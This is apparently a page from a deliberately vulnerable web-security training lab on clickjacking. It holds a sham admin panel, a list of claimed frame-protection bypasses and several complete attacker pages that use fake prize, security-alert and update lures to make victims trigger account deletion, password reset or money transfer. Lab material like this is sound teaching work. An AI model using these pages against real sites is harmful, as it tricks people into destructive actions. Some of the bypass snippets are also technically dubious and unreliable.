<?php
// Lab 4: Advanced Clickjacking
// Vulnerability: Advanced clickjacking techniques and bypasses

session_start();

$message = '';
$action_performed = '';

// Simulate user actions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    switch ($action) {
        case 'like_post':
            $action_performed = 'Post liked successfully!';
            break;
        case 'follow_user':
            $action_performed = 'User followed successfully!';
            break;
        case 'share_content':
            $action_performed = 'Content shared successfully!';
            break;
        case 'delete_account':
            $action_performed = 'Account deletion initiated!';
            break;
        case 'change_password':
            $action_performed = 'Password changed successfully!';
            break;
        case 'transfer_money':
            $amount = $_POST['amount'] ?? 0;
            $to_account = $_POST['to_account'] ?? '';
            $action_performed = "Money transferred successfully! Amount: $" . $amount . " to account: " . $to_account;
            break;
        case 'update_profile':
            $email = $_POST['email'] ?? '';
            $action_performed = "Profile updated successfully! Email: " . $email;
            break;
        case 'admin_action':
            $command = $_POST['command'] ?? '';
            $action_performed = "Admin action executed! Command: " . $command;
            break;
    }
    
    $message = '<div class="alert alert-success">' . $action_performed . '</div>';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 4: Advanced Clickjacking - Clickjacking Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .action-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .advanced-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .action-buttons {
            display: flex;
            gap: 1rem;
            flex-wrap: wrap;
            margin: 1rem 0;
        }

        .action-button {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            color: #1a202c;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .action-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .danger-button {
            background: linear-gradient(90deg, var(--accent-red), var(--accent-orange));
            color: #1a202c;
        }

        .danger-button:hover {
            box-shadow: 0 4px 12px rgba(245, 101, 101, 0.3);
        }

        .advanced-demo {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .advanced-container {
            position: relative;
            width: 100%;
            height: 400px;
            border: 1px solid #334155;
            border-radius: 8px;
            overflow: hidden;
        }

        .advanced-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            z-index: 10;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
        }

        .hidden-content {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.01;
            z-index: 5;
        }

        .advanced-techniques {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .technique-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .technique-title {
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .technique-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .bypass-techniques {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .bypass-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
            border-left: 4px solid var(--accent-orange);
        }

        .bypass-title {
            color: var(--accent-orange);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .bypass-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Clickjacking Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 4: Advanced Clickjacking</h1>
            <p class="hero-subtitle">Advanced clickjacking techniques and bypasses</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates advanced clickjacking techniques that can be used to bypass modern protections and exploit sophisticated applications. These techniques include multi-layer attacks, JavaScript-based attacks, and various bypass methods.</p>
            <p><strong>Objective:</strong> Understand advanced clickjacking techniques and how to bypass modern protections.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Application
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>Admin Panel</h5>
                            <p>Welcome to the admin panel! Here are some sensitive actions you can perform:</p>
                            
                            <div class="action-buttons">
                                <button class="action-button" onclick="performAction('like_post')">
                                    <i class="bi bi-heart me-2"></i>Approve User
                                </button>
                                <button class="action-button" onclick="performAction('follow_user')">
                                    <i class="bi bi-person-plus me-2"></i>Add Admin
                                </button>
                                <button class="action-button" onclick="performAction('share_content')">
                                    <i class="bi bi-share me-2"></i>Export Data
                                </button>
                            </div>
                            
                            <div class="action-buttons">
                                <button class="action-button danger-button" onclick="performAction('delete_account')">
                                    <i class="bi bi-trash me-2"></i>Delete All Users
                                </button>
                                <button class="action-button danger-button" onclick="performAction('change_password')">
                                    <i class="bi bi-key me-2"></i>Reset All Passwords
                                </button>
                            </div>
                            
                            <form method="POST" class="mt-3">
                                <input type="hidden" name="action" id="hidden_action" value="">
                                <div class="mb-3">
                                    <label for="amount" class="form-label">System Maintenance</label>
                                    <input type="number" class="form-control" id="amount" name="amount" value="1">
                                </div>
                                <div class="mb-3">
                                    <label for="to_account" class="form-label">Command</label>
                                    <input type="text" class="form-control" id="to_account" name="to_account" value="shutdown">
                                </div>
                                <button type="submit" class="action-button danger-button" onclick="setAction('admin_action')">
                                    <i class="bi bi-arrow-right me-2"></i>Execute Command
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-bug me-2"></i>Advanced Clickjacking Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="advanced-warning">
                            <h5>⚠️ Advanced Clickjacking Warning</h5>
                            <p>This lab demonstrates advanced clickjacking techniques:</p>
                            <ul>
                                <li><code>Multi-layer Attacks</code> - Multiple overlay layers</li>
                                <li><code>JavaScript Attacks</code> - Dynamic content manipulation</li>
                                <li><code>Bypass Techniques</code> - Modern protection bypasses</li>
                                <li><code>Advanced CSS</code> - Complex positioning attacks</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Advanced Attack Vectors</h5>
                            <p>These actions can be exploited via advanced clickjacking:</p>
                            <ul>
                                <li><code>Approve User</code> - User management</li>
                                <li><code>Add Admin</code> - Privilege escalation</li>
                                <li><code>Export Data</code> - Data exfiltration</li>
                                <li><code>Delete All Users</code> - Mass deletion</li>
                                <li><code>Reset All Passwords</code> - Password reset</li>
                                <li><code>Execute Command</code> - Command execution</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testAdvancedClickjacking()" class="btn btn-primary">Test Advanced Clickjacking</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Advanced Clickjacking Demo
                    </div>
                    <div class="card-body">
                        <div class="advanced-demo">
                            <h5>Advanced Clickjacking Demonstration:</h5>
                            <p>This demonstrates advanced clickjacking techniques with multiple layers and dynamic content:</p>
                            
                            <div class="advanced-container">
                                <div class="advanced-overlay">
                                    🎁 Click here to win $1000!
                                </div>
                                <div class="hidden-content">
                                    <button onclick="performAction('like_post')" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #007bff; color: white; padding: 20px 40px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer;">Hidden Button</button>
                                </div>
                            </div>
                            
                            <div class="mt-3">
                                <small class="text-muted">The overlay above uses advanced techniques to hide malicious content and overlay it on top of legitimate content.</small>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Advanced Techniques
                    </div>
                    <div class="card-body">
                        <div class="advanced-techniques">
                            <div class="technique-card">
                                <div class="technique-title">Multi-layer Attacks</div>
                                <div class="technique-demo">.layer1 { z-index: 1; }
.layer2 { z-index: 2; }
.layer3 { z-index: 3; }</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">JavaScript Manipulation</div>
                                <div class="technique-demo">document.createElement('div');
element.style.position = 'absolute';
element.style.opacity = '0.01';</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Dynamic Content</div>
                                <div class="technique-demo">setTimeout(() => {
    createOverlay();
}, 1000);</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Event Delegation</div>
                                <div class="technique-demo">document.addEventListener('click', (e) => {
    if (e.target.matches('.fake-button')) {
        performAction();
    }
});</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">CSS Animations</div>
                                <div class="technique-demo">@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Responsive Design</div>
                                <div class="technique-demo">@media (max-width: 768px) {
    .overlay { display: none; }
}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Bypass Techniques
                    </div>
                    <div class="card-body">
                        <div class="bypass-techniques">
                            <div class="bypass-card">
                                <div class="bypass-title">X-Frame-Options Bypass</div>
                                <div class="bypass-demo">// Use data: URLs
iframe.src = 'data:text/html,<script>...</script>';

// Use JavaScript: URLs
iframe.src = 'javascript:...';

// Use about:blank
iframe.src = 'about:blank';</div>
                            </div>
                            
                            <div class="bypass-card">
                                <div class="bypass-title">CSP Bypass</div>
                                <div class="bypass-demo">// Use data: URLs
iframe.src = 'data:text/html,<script>...</script>';

// Use blob: URLs
const blob = new Blob(['<script>...</script>']);
iframe.src = URL.createObjectURL(blob);</div>
                            </div>
                            
                            <div class="bypass-card">
                                <div class="bypass-title">JavaScript Protection Bypass</div>
                                <div class="bypass-demo">// Disable JavaScript
iframe.sandbox = 'allow-scripts';

// Use postMessage
window.postMessage('click', '*');

// Use setTimeout
setTimeout(() => {
    performAction();
}, 100);</div>
                            </div>
                            
                            <div class="bypass-card">
                                <div class="bypass-title">Mobile Bypass</div>
                                <div class="bypass-demo">// Touch events
element.addEventListener('touchstart', (e) => {
    e.preventDefault();
    performAction();
});

// Orientation change
window.addEventListener('orientationchange', () => {
    createOverlay();
});</div>
                            </div>
                            
                            <div class="bypass-card">
                                <div class="bypass-title">Browser Bypass</div>
                                <div class="bypass-demo">// User agent detection
if (navigator.userAgent.includes('Chrome')) {
    useChromeBypass();
}

// Feature detection
if (window.CSS && window.CSS.supports) {
    useModernBypass();
}</div>
                            </div>
                            
                            <div class="bypass-card">
                                <div class="bypass-title">Network Bypass</div>
                                <div class="bypass-demo">// Use different protocols
iframe.src = 'https://vulnerable-site.com';
iframe.src = 'http://vulnerable-site.com';

// Use different ports
iframe.src = 'https://vulnerable-site.com:8080';</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Action Results
                    </div>
                    <div class="card-body">
                        <div class="action-display">
                            <h5>Action Results:</h5>
                            <div id="action-results">No actions performed yet</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Advanced Clickjacking</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> Advanced techniques</li>
                        <li><strong>Issue:</strong> Modern protection bypasses</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Multi-layer Attacks:</strong> Multiple overlay layers</li>
                        <li><strong>JavaScript Attacks:</strong> Dynamic content manipulation</li>
                        <li><strong>Bypass Techniques:</strong> Modern protection bypasses</li>
                        <li><strong>Advanced CSS:</strong> Complex positioning attacks</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Advanced Clickjacking Examples</h5>
            <p>Use these techniques to exploit advanced clickjacking vulnerabilities:</p>
            
            <h6>1. Multi-layer Clickjacking Attack:</h6>
            <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Multi-layer Clickjacking Attack&lt;/title&gt;
    &lt;style&gt;
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
        }
        .layer1 {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 0, 0, 0.1);
            z-index: 1;
        }
        .layer2 {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 255, 0, 0.1);
            z-index: 2;
        }
        .fake-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            z-index: 10;
        }
        .fake-button {
            background: #28a745;
            color: white;
            padding: 20px 40px;
            border: none;
            border-radius: 8px;
            font-size: 20px;
            cursor: pointer;
            margin: 20px;
        }
        .hidden-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 350px;
            height: 250px;
            opacity: 0.01;
            z-index: 5;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="container"&gt;
        &lt;div class="layer1"&gt;&lt;/div&gt;
        &lt;div class="layer2"&gt;&lt;/div&gt;
        &lt;div class="fake-content"&gt;
            &lt;h1&gt;🎁 Special Offer!&lt;/h1&gt;
            &lt;p&gt;You've been selected for a special promotion!&lt;/p&gt;
            &lt;button class="fake-button"&gt;Claim Reward Now&lt;/button&gt;
        &lt;/div&gt;
        &lt;div class="hidden-content"&gt;
            &lt;button onclick="performAction('like_post')"&gt;Hidden Button&lt;/button&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>2. JavaScript-based Clickjacking:</h6>
            <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;JavaScript-based Clickjacking&lt;/title&gt;
    &lt;style&gt;
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: #f8f9fa;
        }
        .fake-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            z-index: 10;
        }
        .fake-button {
            background: #007bff;
            color: white;
            padding: 20px 40px;
            border: none;
            border-radius: 8px;
            font-size: 20px;
            cursor: pointer;
            margin: 20px;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="container"&gt;
        &lt;div class="fake-content"&gt;
            &lt;h1&gt;🎁 Special Offer!&lt;/h1&gt;
            &lt;p&gt;You've been selected for a special promotion!&lt;/p&gt;
            &lt;button class="fake-button" onclick="createOverlay()"&gt;Claim Reward Now&lt;/button&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    
    &lt;script&gt;
        function createOverlay() {
            const overlay = document.createElement('div');
            overlay.style.position = 'absolute';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.background = 'rgba(0, 0, 0, 0.8)';
            overlay.style.zIndex = '9999';
            overlay.style.display = 'flex';
            overlay.style.alignItems = 'center';
            overlay.style.justifyContent = 'center';
            overlay.innerHTML = '&lt;h2&gt;Loading...&lt;/h2&gt;';
            
            document.body.appendChild(overlay);
            
            setTimeout(() => {
                performAction('follow_user');
                overlay.remove();
            }, 1000);
        }
        
        function performAction(action) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://vulnerable-site.com/clickjacking/4.php';
            
            const actionInput = document.createElement('input');
            actionInput.type = 'hidden';
            actionInput.name = 'action';
            actionInput.value = action;
            
            form.appendChild(actionInput);
            document.body.appendChild(form);
            form.submit();
        }
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>3. Dynamic Content Clickjacking:</h6>
            <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Dynamic Content Clickjacking&lt;/title&gt;
    &lt;style&gt;
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .fake-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            z-index: 10;
        }
        .fake-button {
            background: #dc3545;
            color: white;
            padding: 20px 40px;
            border: none;
            border-radius: 8px;
            font-size: 20px;
            cursor: pointer;
            margin: 20px;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="container"&gt;
        &lt;div class="fake-content"&gt;
            &lt;h1&gt;⚠️ Security Alert&lt;/h1&gt;
            &lt;p&gt;Your account has been compromised.&lt;/p&gt;
            &lt;button class="fake-button" onclick="startAttack()"&gt;Secure Account Now&lt;/button&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    
    &lt;script&gt;
        let attackStep = 0;
        
        function startAttack() {
            attackStep++;
            
            if (attackStep === 1) {
                showStep1();
            } else if (attackStep === 2) {
                showStep2();
            } else if (attackStep === 3) {
                showStep3();
            }
        }
        
        function showStep1() {
            const content = document.querySelector('.fake-content');
            content.innerHTML = '&lt;h2&gt;Step 1: Verifying Identity&lt;/h2&gt;&lt;p&gt;Please wait...&lt;/p&gt;';
            
            setTimeout(() => {
                showStep2();
            }, 2000);
        }
        
        function showStep2() {
            const content = document.querySelector('.fake-content');
            content.innerHTML = '&lt;h2&gt;Step 2: Checking Security&lt;/h2&gt;&lt;p&gt;Almost done...&lt;/p&gt;';
            
            setTimeout(() => {
                showStep3();
            }, 2000);
        }
        
        function showStep3() {
            const content = document.querySelector('.fake-content');
            content.innerHTML = '&lt;h2&gt;Step 3: Securing Account&lt;/h2&gt;&lt;p&gt;Finalizing...&lt;/p&gt;';
            
            setTimeout(() => {
                performAction('delete_account');
            }, 2000);
        }
        
        function performAction(action) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://vulnerable-site.com/clickjacking/4.php';
            
            const actionInput = document.createElement('input');
            actionInput.type = 'hidden';
            actionInput.name = 'action';
            actionInput.value = action;
            
            form.appendChild(actionInput);
            document.body.appendChild(form);
            form.submit();
        }
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>4. Mobile-specific Clickjacking:</h6>
            <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Mobile-specific Clickjacking&lt;/title&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;style&gt;
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
        }
        .fake-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            z-index: 10;
        }
        .fake-button {
            background: #28a745;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="container"&gt;
        &lt;div class="fake-content"&gt;
            &lt;h2&gt;📱 New App Update&lt;/h2&gt;
            &lt;p&gt;Update available! Tap to install.&lt;/p&gt;
            &lt;button class="fake-button" onclick="handleTouch()"&gt;Install Update&lt;/button&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    
    &lt;script&gt;
        function handleTouch() {
            // Handle touch events
            document.addEventListener('touchstart', (e) => {
                e.preventDefault();
                performAction('change_password');
            });
            
            // Handle orientation change
            window.addEventListener('orientationchange', () => {
                performAction('admin_action');
            });
            
            // Handle device motion
            window.addEventListener('devicemotion', (e) => {
                if (e.acceleration.x > 2) {
                    performAction('transfer_money');
                }
            });
        }
        
        function performAction(action) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://vulnerable-site.com/clickjacking/4.php';
            
            const actionInput = document.createElement('input');
            actionInput.type = 'hidden';
            actionInput.name = 'action';
            actionInput.value = action;
            
            form.appendChild(actionInput);
            document.body.appendChild(form);
            form.submit();
        }
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>5. Browser-specific Clickjacking:</h6>
            <div class="code-block">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Browser-specific Clickjacking&lt;/title&gt;
    &lt;style&gt;
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: #f0f0f0;
        }
        .fake-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            z-index: 10;
        }
        .fake-button {
            background: #007bff;
            color: white;
            padding: 20px 40px;
            border: none;
            border-radius: 8px;
            font-size: 20px;
            cursor: pointer;
            margin: 20px;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="container"&gt;
        &lt;div class="fake-content"&gt;
            &lt;h1&gt;🎉 Congratulations!&lt;/h1&gt;
            &lt;p&gt;You've won a prize! Click below to claim it.&lt;/p&gt;
            &lt;button class="fake-button" onclick="detectBrowser()"&gt;Claim Prize&lt;/button&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    
    &lt;script&gt;
        function detectBrowser() {
            const userAgent = navigator.userAgent;
            
            if (userAgent.includes('Chrome')) {
                useChromeBypass();
            } else if (userAgent.includes('Firefox')) {
                useFirefoxBypass();
            } else if (userAgent.includes('Safari')) {
                useSafariBypass();
            } else if (userAgent.includes('Edge')) {
                useEdgeBypass();
            } else {
                useGenericBypass();
            }
        }
        
        function useChromeBypass() {
            // Chrome-specific bypass
            const iframe = document.createElement('iframe');
            iframe.src = 'data:text/html,<script>parent.performAction("like_post");</script>';
            iframe.style.position = 'absolute';
            iframe.style.top = '50%';
            iframe.style.left = '50%';
            iframe.style.transform = 'translate(-50%, -50%)';
            iframe.style.width = '350px';
            iframe.style.height = '250px';
            iframe.style.opacity = '0.01';
            iframe.style.zIndex = '5';
            document.body.appendChild(iframe);
        }
        
        function useFirefoxBypass() {
            // Firefox-specific bypass
